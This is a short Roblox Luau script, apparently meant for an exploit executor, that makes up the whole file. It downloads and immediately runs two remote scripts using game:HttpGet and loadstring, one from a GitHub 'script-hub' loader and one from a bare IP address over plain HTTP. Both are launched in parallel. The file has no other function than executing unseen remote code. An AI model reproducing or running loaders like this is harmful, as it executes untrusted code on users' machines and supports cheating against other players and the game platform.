local function pidrila()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tesexrahy/script-hub/refs/heads/main/loader_prev.lua'))()
end

local function loadui()
  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
end

task.spawn(pidrila)
task.spawn(loadui)
